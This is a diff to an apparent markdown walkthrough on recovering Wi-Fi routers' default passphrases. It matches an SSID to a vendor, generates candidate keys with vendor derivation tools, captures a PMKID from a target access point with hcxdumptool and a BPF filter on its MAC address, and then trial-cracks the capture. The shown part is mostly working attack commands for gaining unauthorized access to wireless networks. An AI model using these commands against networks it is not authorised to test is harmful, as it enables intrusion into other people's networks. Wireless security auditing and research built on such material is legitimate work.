@@ -1,5 +1,7 @@
 # default-psk-derivation — walkthrough
 
+**Verified against:** hcxpsktool + upc_keys as of 2026-Q3
+
 Match the beacon's SSID against a known-vendor regex; run the
 vendor's derivation; validate against a captured PMKID or 4-way.
 
@@ -74,9 +76,13 @@ Fastest. Capture a PMKID (`pmkid/walkthrough.md`), then trial-crack
 against the candidate list.
 
 ```
-# 1. Capture PMKID.
-hcxdumptool -i wlan1mon --enable_status=1 -o /tmp/pmkid.pcapng \
-            --filterlist_ap=/root/target.bssidlist --filtermode=2
+# 1. Capture PMKID (hcxdumptool 7.3 CLI; see hcx-tools/reference.md
+#    for the compat table if you're following an older tutorial).
+echo 'wlan addr3 aa:bb:cc:dd:ee:ff' > /root/target.bpf.src
+tcpdump -y IEEE802_11_RADIO -F /root/target.bpf.src -ddd \
+        > /root/target.bpf
+hcxdumptool -i wlan1mon --enable_status=3 -w /tmp/pmkid.pcapng \
+            --bpf=/root/target.bpf
 hcxpcapngtool -o /tmp/hs.22000 /tmp/pmkid.pcapng
 
 # 2. Trial-crack against the vendor's candidate list.
